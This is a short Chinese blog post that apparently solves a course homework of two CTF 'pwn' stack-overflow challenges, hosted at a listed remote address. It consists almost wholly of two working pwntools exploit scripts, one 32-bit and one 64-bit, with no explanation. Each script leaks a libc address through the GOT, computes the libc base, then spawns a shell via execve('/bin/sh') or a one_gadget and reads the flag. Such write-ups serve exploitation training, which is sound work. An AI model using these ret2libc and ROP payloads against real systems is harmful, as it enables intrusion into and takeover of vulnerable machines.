---
title: 软件漏洞挖掘与利用作业 之 两个pwn题
date: 2019-10-18 00:00:00
categories:
- CTF/Pwn
tags: canary绕过 StackOverflow ROP ROPgadget OneGadget
---

32位题目地址：nc 202.112.51.157 9001  
64位题目地址：nc 202.112.51.157 9002

## 32位

```python
from pwn import *
context(arch='i386',os='linux',log_level='error')

#libc = ELF("/lib/i386-linux-gnu/libc.so.6")
libc = ELF("./libc-2.23.so")
myelf = ELF("./vul32")

io = remote("202.112.51.157",9001)
# io = process(myelf.path)
# gdb.attach(io,"b * main")

libc_bin_sh = libc.search("/bin/sh").next()
libc_read = libc.symbols["read"]
libc_exec = libc.symbols["execve"]

plt_write = myelf.plt["write"]
got_read  = myelf.got["read"]
elf_main  = myelf.symbols["main"]

payload = ""
payload += 'A'*51+"C"
payload += p32(0)+p32(plt_write)+p32(elf_main)
payload += p32(1)+p32(got_read)+p32(4)

io.recv()
io.sendline(payload)
io.recvline()
leak_read = u32(io.recv(4))
io.recv()

libc_base = leak_read - libc_read
leak_exec = libc_base + libc_exec
leak_bin_sh = libc_base +libc_bin_sh

payload = ""
payload += 'B'*51+"C"
payload += p32(0)+p32(leak_exec)+p32(elf_main)
payload += p32(leak_bin_sh)+p32(0)+p32(0)

io.sendline(payload)
io.sendline("cat /flag")
io.interactive()
```


## 64位


```python
from pwn import *
context(arch='amd64',os='linux',log_level='error')

#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") 
libc = ELF("./libc-2.23.so")
myelf = ELF("./vul64")

io = remote("202.112.51.157",9002)
# io = process(myelf.path)
# gdb.attach(io,"b * main")

libc_read = libc.symbols['read']
plt_puts = myelf.plt['puts']
got_read = myelf.got['read']
elf_main = myelf.symbols['main']

rop_pop_rdi = 0x400933
rop_one_gadget = 0xf1147

payload = ""
payload += 'A'*51+'?'
payload += p64(0)
payload += p64(rop_pop_rdi)
payload += p64(got_read)
payload += p64(plt_puts)
payload += p64(elf_main)

io.recv()
io.sendline(payload)
io.recvline()

leak_read = u64(io.recv(8))&0x0000ffffffffffff
libc_base = leak_read - libc_read
one_gadget = libc_base + rop_one_gadget

payload = ""
payload += 'A'*51+'?'
payload += p64(0)
payload += p64(one_gadget)

io.recv()
io.sendline(payload)
io.sendline("cat /flag")
io.interactive()

```